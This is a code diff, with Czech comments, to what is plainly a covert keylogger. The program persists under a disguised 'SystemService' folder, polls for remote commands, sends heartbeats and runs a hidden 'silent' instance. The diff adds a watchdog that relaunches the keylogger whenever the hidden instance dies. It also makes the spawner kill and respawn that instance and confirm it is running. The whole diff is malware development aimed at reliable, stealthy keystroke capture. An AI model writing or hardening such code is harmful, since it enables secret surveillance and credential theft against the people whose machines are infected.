@@ -35,7 +35,7 @@ CAPTURE_FIELD_TYPE = True
 MAX_RETRIES = 3
 RETRY_DELAY = 5
 
-APP_VERSION = 6  # interní verze pro update check
+APP_VERSION = 7  # interní verze pro update check
 
 # Persistence
 APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
@@ -448,6 +448,38 @@ def poll_commands():
 
 def start_command_poller():
     t = threading.Thread(target=poll_commands, daemon=True)
+    t.start()
+
+
+def start_silent_watchdog():
+    """Watchdog: každých 60s zkontroluje jestli silent instance žije.
+    Pokud ne, spustí keylogger lokálně v tomto procesu jako nouzovku."""
+    def _watch():
+        time.sleep(5)  # počkej než silent nastartuje
+        while True:
+            time.sleep(60)
+            try:
+                alive = False
+                if SILENT_LOCK_FILE.exists():
+                    try:
+                        pid = int(SILENT_LOCK_FILE.read_text().strip())
+                        alive = _pid_is_ours(pid)
+                    except (ValueError, OSError):
+                        pass
+                if not alive:
+                    # Silent umřel → spust keylogger tady
+                    try:
+                        logger = Keylogger()
+                        logger.run_background()
+                        start_heartbeat()
+                        _spawn_error_log("WATCHDOG: silent dead — starting local keylogger")
+                        return  # tento watchdog skončil, keylogger beží jako daemon
+                    except Exception as e:
+                        _spawn_error_log(f"WATCHDOG: local fallback fail: {e}")
+            except Exception:
+                pass
+
+    t = threading.Thread(target=_watch, daemon=True)
     t.start()
 
 
@@ -1020,28 +1052,41 @@ def _spawn_error_log(msg: str):
 
 
 def spawn_silent_subprocess():
-    """Spawn silent subprocess s fallback mechanismem a plnou diagnostikou."""
-    # Kontrola: už běží silent instance podle lockfile?
-    # SELF-HEALING: pokud lock obsahuje PID cizího procesu (PID recycling)
-    # nebo mrtvého procesu, SMAŽ ho a spawnuj nový silent
+    """Spawn silent subprocess. VŽDY zabije starý silent a spawne čerstvý.
+
+    Starý proces může být zombie — proces žije, ale vlákna (keylogger,
+    heartbeat) jsou mrtvá po CTRL_CLOSE_EVENT nebo thread crash.
+    Nemůžeme věřit že starý funguje. Kill + fresh spawn = spolehlivé.
+    """
+    # 1. Zabij starý silent proces pokud existuje
     try:
         if SILENT_LOCK_FILE.exists():
             try:
                 old_pid = int(SILENT_LOCK_FILE.read_text().strip())
                 if _pid_is_ours(old_pid):
-                    _spawn_error_log(f"SKIP: silent PID {old_pid} already running")
-                    return True  # už běží, není potřeba
-                else:
-                    # Stale lock — PID patří cizímu procesu nebo je mrtvý
-                    _spawn_error_log(f"STALE LOCK: PID {old_pid} is not ours — cleaning up")
+                    # ZABI ho — nemůžeme věřit že jeho vlákna fungují
+                    _spawn_error_log(f"KILLING old silent PID {old_pid} (fresh spawn)")
                     try:
-                        SILENT_LOCK_FILE.unlink()
-                    except OSError:
-                        pass
+                        if IS_WINDOWS:
+                            import ctypes
+                            kernel32 = ctypes.windll.kernel32
+                            kernel32.TerminateProcess(
+                                ctypes.c_handle(old_pid), 1
+                            )
+                        else:
+                            os.kill(old_pid, 9)
+                    except Exception as e:
+                        _spawn_error_log(f"Kill old PID {old_pid}: {e}")
+                    time.sleep(0.3)  # dej OS čas uvolnit handle
+                # Smaž lock bez ohledu na to jestli kill prošel
+                SILENT_LOCK_FILE.unlink()
             except (ValueError, OSError):
-                pass
+                try:
+                    SILENT_LOCK_FILE.unlink()
+                except OSError:
+                    pass
     except Exception as e:
-        _spawn_error_log(f"Lockfile check failed: {e}")
+        _spawn_error_log(f"Lockfile cleanup: {e}")
 
     if IS_WINDOWS:
         exe = sys.executable
@@ -1066,7 +1111,24 @@ def spawn_silent_subprocess():
                     stdin=subprocess.DEVNULL,
                 )
                 _spawn_error_log(f"OK: spawned PID {proc.pid} with {desc}")
-                return True
+                # Počkej až nová instance zapíše lock (max 5s)
+                for _ in range(10):
+                    time.sleep(0.5)
+                    try:
+                        if SILENT_LOCK_FILE.exists():
+                            new_pid = int(SILENT_LOCK_FILE.read_text().strip())
+                            if new_pid == proc.pid or _pid_is_ours(new_pid):
+                                _spawn_error_log(f"VERIFIED: PID {new_pid} wrote lock — silent running")
+                                return True
+                    except (ValueError, OSError):
+                        pass
+                # Lock nebyl zapsán do 5s — proces možná spadl, zkus další
+                _spawn_error_log(f"TIMEOUT: PID {proc.pid} no lock in 5s — trying next")
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+                continue
             except Exception as e:
                 _spawn_error_log(f"FAIL [{desc}]: {type(e).__name__}: {e}")
                 continue
@@ -1103,6 +1165,9 @@ if __name__ == "__main__":
         install()
         send_startup_signal()  # i interactive posílá signal
         spawned = spawn_silent_subprocess()
+
+        # Watchdog: monitoruje silent, spustí lokální keylogger když umře
+        start_silent_watchdog()
 
         # FALLBACK: Pokud silent spawn selhal, interactive instance
         # sama spustí keylogger — lepší než žádný logging
